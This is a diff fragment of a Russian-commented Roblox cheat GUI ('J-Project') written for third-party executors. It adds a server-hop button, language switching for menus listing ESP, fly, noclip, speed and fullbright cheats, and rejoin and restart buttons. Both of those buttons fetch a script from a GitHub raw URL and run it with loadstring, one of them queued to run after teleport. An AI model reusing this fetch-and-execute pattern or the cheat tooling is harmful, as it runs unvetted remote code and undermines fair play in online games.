+    findServerBtn.TextColor3 = CurrentTheme.White
+    findServerBtn.ZIndex = 6
+    Instance.new("UICorner", findServerBtn).CornerRadius = UDim.new(0, 6)
+
+    local findBtnStroke = Instance.new("UIStroke", findServerBtn)
+    findBtnStroke.Thickness = 1
+    findBtnStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = findServerBtn, Stroke = findBtnStroke})
+
+    findServerBtn.MouseButton1Click:Connect(function()
+        local maxTarget = tonumber(playerBox.Text) or 2
+        findServerBtn.Text = L("Searching")
+        findServerBtn.TextColor3 = Color3.fromRGB(255, 200, 60)
+        
+        task.spawn(function()
+            local HttpService = game:GetService("HttpService")
+            local TeleportService = game:GetService("TeleportService")
+            local url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
+            
+            local success, result = pcall(function()
+                return game:HttpGet(url)
+            end)
+            
+            if success then
+                local data = HttpService:JSONDecode(result)
+                if data and data.data then
+                    for _, server in ipairs(data.data) do
+                        if server.playing <= maxTarget and server.playing > 0 and server.id ~= game.JobId and server.maxPlayers > server.playing then
+                            findServerBtn.Text = L("Joining")
+                            findServerBtn.TextColor3 = Color3.fromRGB(60, 225, 100)
+                            TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, LocalPlayer)
+                            return
+                        end
+                    end
+                end
+            end
+            
+            findServerBtn.Text = L("NotFound")
+            findServerBtn.TextColor3 = Color3.fromRGB(225, 60, 60)
+            task.wait(1.5)
+            findServerBtn.Text = L("FindBtn")
+            findServerBtn.TextColor3 = CurrentTheme.White
+        end)
+    end)
+end)
+
+task.spawn(function()
+    -- Кнопка перезахода на сервер
+    addStyledButton(settingsPage, L("RejoinBtn"), function()
+        local TeleportService = game:GetService("TeleportService")
+        local queueOnTeleport = (syn and syn.queue_on_teleport) or queue_on_teleport or queueonteleport or (fluxus and fluxus.queue_on_teleport)
+        if queueOnTeleport then
+            queueOnTeleport('repeat task.wait() until game:IsLoaded() loadstring(game:HttpGet("https://raw.githubusercontent.com/Korol1Laguwok/Jez-Scripts/refs/heads/main/J_3.txt"))()')
+        end
+
+        if #Players:GetPlayers() <= 1 then
+            LocalPlayer:Kick("\n[J-Project] Rejoining...")
+            task.wait()
+            TeleportService:Teleport(game.PlaceId, LocalPlayer)
+        else
+            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
+        end
+    end).Name = "RejoinBtn"
+
+    -- Кнопка перезапуска GUI (безопасная перезагрузка J_3.txt)
+    addStyledButton(settingsPage, L("RestartBtn"), function()
+        stopRainbowTheme()
+        espEnabled = false
+        stopFly()
+        isLightEnabled = false
+        isGlobalFullbright = false
+        applyGlobalFullbright(false)
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            local light = LocalPlayer.Character.HumanoidRootPart:FindFirstChild("JezPointLight")
+            if light then light:Destroy() end
+        end
+        espFolder:ClearAllChildren()
+        ClockFrame.Visible = false
+        ScreenGui:Destroy()
+
+        task.spawn(function()
+            task.wait(0.2)
+            local success, code = pcall(function()
+                return game:HttpGet("https://raw.githubusercontent.com/Korol1Laguwok/Jez-Scripts/refs/heads/main/J_3.txt")
+            end)
+
+            if success and code then
+                local func, err = loadstring(code)
+                if func then
+                    func()
+                else
+                    warn("[J-Project Error] Ошибка синтаксиса в J_3.txt: " .. tostring(err))
+                end
+            else
+                warn("[J-Project Error] Не удалось скачать J_3.txt!")
+            end
+        end)
+    end).Name = "RestartBtn"
+
+    -- Кнопка полной выгрузки
+    addStyledButton(settingsPage, L("UnloadBtn"), function()
+        stopRainbowTheme()
+        espEnabled = false
+        stopFly()
+        isLightEnabled = false
+        isGlobalFullbright = false
+        applyGlobalFullbright(false)
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            local light = LocalPlayer.Character.HumanoidRootPart:FindFirstChild("JezPointLight")
+            if light then light:Destroy() end
+        end
+        espFolder:ClearAllChildren()
+        ClockFrame.Visible = false
+        ScreenGui:Destroy()
+    end).Name = "UnloadBtn"
+end)
+
+-- ==========================================
+--        ОБНОВЛЕНИЕ ЯЗЫКА И ИНТЕРФЕЙСА
+-- ==========================================
+
+function updateInterfaceLanguage()
+    local dict = Localizations[currentLanguage]
+    if not dict then return end
+
+    local function setText(obj, text)
+        if obj and text ~= nil then obj.Text = text end
+    end
+
+    local function byName(root, name)
+        if not root then return nil end
+        return root:FindFirstChild(name, true)
+    end
+
+    local function stateText(prefix, active)
+        return prefix .. (active and L("StatusOn") or L("StatusOff"))
+    end
+
+    -- Header / intro
+    setText(LangBtn, currentLanguage)
+    setText(HeaderTitle, L("Welcome") .. string.upper(username or "USER"))
+    setText(SubText, L("IntroSub"))
+
+    -- Tabs
+    local tabNames = L("Tabs")
+    if type(tabNames) == "table" and tabs then
+        for _, tabData in ipairs(tabs) do
+            setText(tabData.Button, tabNames[tabData.Key])
+        end
+    end
+
+    -- Main page
+    if newsCard then
+        setText(newsCard:FindFirstChild("CardTitle"), L("NewsTitle"))
+        setText(newsCard:FindFirstChild("CardBody"), L("NewsContent"))
+        setText(byName(newsCard, "ChatBtn"), L("ChatBtn"))
+    end
+    if guideCard then
+        setText(guideCard:FindFirstChild("CardTitle"), L("GuideTitle"))
+        setText(guideCard:FindFirstChild("CardBody"), L("GuideContent"))
+    end
+
+    -- Scripts page
+    if searchBox then
+        searchBox.PlaceholderText = L("SearchPlaceholder")
+    end
+    local query = searchBox and searchBox.Text:lower():match("^%s*(.-)%s*$") or ""
+    local scriptTexts = dict.ScriptsList or {}
+    for _, item in ipairs(scriptCards or {}) do
+        local title = scriptTexts[item.TitleKey] or item.TitleKey
+        local desc = scriptTexts[item.DescKey] or item.DescKey
+        setText(item.TitleLabel, title)
+        setText(item.DescLabel, desc)
+        setText(item.ExecBtn, L("Execute"))
+        item.Title = tostring(title):lower()
+        item.Desc = tostring(desc):lower()
+        if item.Frame then
+            item.Frame.Visible = query == ""
+                or string.find(item.Title, query, 1, true) ~= nil
+                or string.find(item.Desc, query, 1, true) ~= nil
+        end
+    end
+
+    -- Animations page
+    setText(byName(animationsPage, "AnimTitle"), L("AnimationsTitle"))
+    setText(byName(animationsPage, "R6Btn"), L("R6Btn"))
+    setText(byName(animationsPage, "R15Btn"), L("R15Btn"))
+
+    -- Player page
+    setText(byName(playerPage, "SpeedTitle"), L("SpeedTitle"))
+    setText(byName(playerPage, "ResetBtn"), L("ResetSpeed"))
+    setText(byName(playerPage, "BoostBtn"), L("BoostSpeed"))
+    if updateSpeedDisplay then updateSpeedDisplay() end
+
+    setText(byName(playerPage, "PlatformTitle"), L("PlatformTitle"))
+
+    setText(byName(playerPage, "FlyTitle"), L("FlyTitle"))
+    setText(byName(playerPage, "FlySpeedTitle"), L("FlySpeedLabel"))
+
+    setText(byName(playerPage, "InfJumpTitle"), L("InfJumpTitle"))
+    setText(byName(playerPage, "AntiAfkTitle"), L("AntiAfkTitle"))
+    setText(byName(playerPage, "NoclipTitle"), L("NoclipTitle"))
+
+    setText(byName(playerPage, "VehicleFlyTitle"), L("VehicleFlyTitle"))
+    setText(byName(playerPage, "VehicleFlySpeedTitle"), L("VehicleFlySpeedLabel"))
+
+    -- Visual page
+    setText(byName(visualPage, "EspTitle"), L("EspTitle"))
+    setText(byName(visualPage, "LightTitleLabel"), L("LightTitle"))
+    setText(byName(visualPage, "LightBrightnessLabel"), L("LightBrightnessLabel"))
+    setText(byName(visualPage, "LightRangeLabel"), L("LightRangeLabel"))
+    setText(byName(visualPage, "LightToggleBtn"), stateText("LIGHT", isLightEnabled))
+
+    setText(byName(visualPage, "GlobalFullbrightTitleLabel"), L("GlobalFullbrightTitle"))
+    setText(byName(visualPage, "GlobalFullbrightToggleBtn"), stateText("WORLD", isGlobalFullbright))
+
+    setText(byName(visualPage, "StatsBtn"), L("StatsTitle"))
+    setText(byName(visualPage, "ClockRowBtn"), L("ClockTitle"))
+    setText(byName(visualPage, "KeyRowBtn"), L("KeyTitle"))
+
+    -- Themes page
+    setText(resetThemeBtn, L("ResetTheme"))
+
+    -- Settings page
+    setText(byName(settingsPage, "ServerHopTitle"), L("ServerHopTitle"))
+    setText(byName(settingsPage, "FindServerBtn"), L("FindBtn"))
+    setText(byName(settingsPage, "RejoinBtn"), L("RejoinBtn"))
+	setText(byName(settingsPage, "RestartBtn"), L("RestartBtn"))
+    setText(byName(settingsPage, "UnloadBtn"), L("UnloadBtn"))
+end
+
+LangBtn.MouseButton1Click:Connect(function()
+    currentLanguage = (currentLanguage == "RU") and "EN" or "RU"
+    local ok, err = pcall(updateInterfaceLanguage)
+    if not ok then
+        warn("[J-Project] updateInterfaceLanguage failed: " .. tostring(err))
     end
 end)
 
+-- Установка начальной вкладки
+if tabs and tabs[1] then
+    switchTab(tabs[1])
+end
 
+-- ==========================================
+--        ПЛАВНЫЙ СТАРТ И ИНИЦИАЛИЗАЦИЯ
+-- ==========================================
 
-
-pcall(function()
-    script.Parent = nil 
+task.spawn(function()
+    IntroCard.Visible = true
+    IntroScale.Scale = 0
+    
+    tween(IntroScale, TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1})
+    task.wait(0.45)
+    
+    local progressTween = tween(ProgressBar, TweenInfo.new(2.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Size = UDim2.new(1, 0, 1, 0)
+    })
+    progressTween.Completed:Wait()
+    task.wait(0.2)
+    
+    local hideIntro = tween(IntroScale, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Scale = 0})
+    hideIntro.Completed:Wait()
+    IntroCard.Visible = false
+    
+    MainFrame.Visible = true
+    MainScale.Scale = 0
+    tween(MainScale, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1})
 end)
